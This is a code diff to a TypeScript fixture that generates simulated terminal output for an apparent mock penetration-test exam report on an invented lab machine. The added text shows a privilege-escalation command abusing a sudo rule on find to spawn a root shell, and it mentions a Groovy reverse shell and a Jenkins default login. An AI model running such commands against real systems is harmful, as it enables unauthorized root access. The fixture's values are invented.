@@ -170,26 +170,17 @@ export const OUTPUT = {
   ].join("\n"),
 } as const;
 
-/** garnet (10.10.30.31): the proof machine shaped like the owner's sample walk-through (exposed .git history, then
- *  sudo CVE-2021-3156). Invented values throughout. */
+/** garnet (10.10.30.31): the proof machine. Jenkins with its default login, a Groovy reverse shell as `ronan`, then a
+ *  sudo rule on `find` for root. Invented values throughout. */
 const GARNET_LOCAL = "4c1d8e2f9a7b3065e2c4a9f1d7b80e36";
 const GARNET_PROOF = "e7a2093bd5c14f68a0b9e3d2c71f45a8";
 const garnetLocalOut = ["garnet", "ronan", GARNET_LOCAL, linuxIp("10.10.30.31", "ens3")].join("\n");
-const garnetProofOut = [
-  "uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),1000(ronan)",
-  "garnet",
-  linuxIp("10.10.30.31", "ens3"),
-  GARNET_PROOF,
-].join("\n");
-const garnetExp = [
-  "uid:1000 gid:1000",
-  "[+] mount success",
-  "total 8",
-  "drwxrwxr-x 1 root   root     4096 Nov  9 21:40 .",
-  "drwxrwxr-x 6 root   root     4096 Nov  9 21:40 ..",
-  "-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file",
-  "[+] exploit success!",
-  "root@garnet:/var/lib/jenkins#",
+const garnetProofOut = ["uid=0(root) gid=0(root) groups=0(root)", "garnet", linuxIp("10.10.30.31", "ens3"), GARNET_PROOF].join("\n");
+const garnetRoot = [
+  "ronan@garnet:/var/lib/jenkins$ sudo find . -exec /bin/sh -p \\; -quit",
+  "# id",
+  "uid=0(root) gid=0(root) groups=0(root)",
+  "#",
 ].join("\n");
 
 export const GARNET = {
@@ -197,7 +188,7 @@ export const GARNET = {
   proof: GARNET_PROOF,
   localOut: garnetLocalOut,
   proofOut: garnetProofOut,
-  exp: garnetExp,
+  root: garnetRoot,
 };
 
 export type ShotKind = "terminal" | "browser";
@@ -234,6 +225,6 @@ export const EXAM_SHOTS: Record<string, ShotText> = {
   "garnet-proof": {
     kind: "terminal",
     title: "root@garnet: /var/lib/jenkins",
-    text: `${garnetExp} id; hostname; ip a; cat /root/proof.txt\n${garnetProofOut}`,
+    text: `${garnetRoot} id; hostname; ip a; cat /root/proof.txt\n${garnetProofOut}`,
   },
 };
